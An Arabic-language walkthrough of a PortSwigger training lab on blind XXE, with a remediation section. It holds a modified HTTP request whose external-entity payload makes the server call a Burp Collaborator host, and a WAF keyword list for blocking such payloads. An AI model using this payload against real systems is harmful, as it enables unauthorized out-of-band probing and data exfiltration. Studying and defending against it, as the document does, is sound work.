# [Blind XXE with out-of-band interaction](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)

## **`الهدف`**
قم باستخدام `External Entity` لجعل الـ ` XML Parser` يُصدر `DNS lookup و HTTP request` إلى `Burp Collaborator`.
## **`خطوات الحل`**
**`ملاحظة هامة:`** لا يمكن حل هذا اللاب إلا باستعمال أداة `Burp Collaborator` والتي تتوفر فقط في النسخة المدفوعة من `Burp Suite`.

بعد الدخول إلى اللاب سنتوجه إلى أى منتج ونقوم بالضغط على `Check stock` وبعد ذلك سنجد في الـ `HTTP history` الـطلب التالي فسنقوم بتحويله إلى `Repeater`
```http
POST /product/stock HTTP/2
Host: 0af700c803bff93780440dcf003d00f6.web-security-academy.net
Cookie: session=ZF07DFvAtGHJPo4oLel9TWihaBl0LViE

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

ثم سنقوم بتعديل الطلب كالتالي مع وضع رابط الـ `Subdomain` الخاص بـ `Burp Collaborator` في موضعه.
```http
POST /product/stock HTTP/2
Host: 0af700c803bff93780440dcf003d00f6.web-security-academy.net
Cookie: session=ZF07DFvAtGHJPo4oLel9TWihaBl0LViE

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY test SYSTEM "http://pkd19iwli6adw8xzder4dxovpmvfj77w.oastify.com">]>
<stockCheck><productId>&test;</productId><storeId>1</storeId></stockCheck>
```
ثم نقوم بإرسال الطلب لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب تعطيل قراءة الـ `DTDs` والكيانات الخارجية `External Entities` من إعدادات مكتبة الـ `XML Parser`، وفي في حال كان التطبيق يحتاج فعليًا لاستخدام `DTDs`، فيجب على الأقل تعطيل `external-general-entities` و `external-parameter-entities`.

وإذا كان التطبيق لا يحتاج فعليًا لمميزات الـ `XML` المعقدة فإن أفضل شئ هو استبدال الـ `XML` بـ `JSON` في استقبال وإرسال البيانات بين العميل والسيرفر.

وكطبقة حماية إضافية، يُمكن ضبط الـ `WAF` لرفض أى طلب `HTTP` يحتوى على كلمات مثل `<!DOCTYPE` أو `<!ENTITY` أو `SYSTEM` أو `xmlns:xi` أو `xi:include` داخل جسم الطلب، إذا كان التطبيق لا يستخدمها بأي شكل شرعي.

ويجب تطبيق سياسة تقييد الاتصالات الصادرة `Egress Filtering` على مستوى الجدار الناري `Firewall`، بحيث يتم منع سيرفر الويب من إجراء أي اتصالات صادرة `Outbound Connections` نحو شبكة الإنترنت الخارجية بشكل افتراضي تطبيقًا لمبدأ المنع الافتراضي `Default Deny`، والسماح للسيرفر فقط بالاتصال بالوجهات الخارجية الضرورية والمحددة مسبقاً عبر قائمة بيضاء صارمة `Strict Whitelist`، لمنع المهاجم من استغلال السيرفر للاتصال بخوادم خارجية يتحكم بها `OAST` لتأكيد الثغرات العمياء `Blind XXE` أو تسريب البيانات `Out-of-band Data Exfiltration`.

وكخط دفاع أخير على مستوى نظام التشغيل `OS`، يجب ألا يعمل تطبيق الويب بصلاحيات مستخدم `Root` ويعمل بصلاحيات مستخدم محدود مثل `www-data` ولا يملك صلاحية قراءة الملفات الحساسة مثل `/etc/shadow` أو مفاتيح `SSH` أو ملفات إعدادات التطبيقات الأخرى.
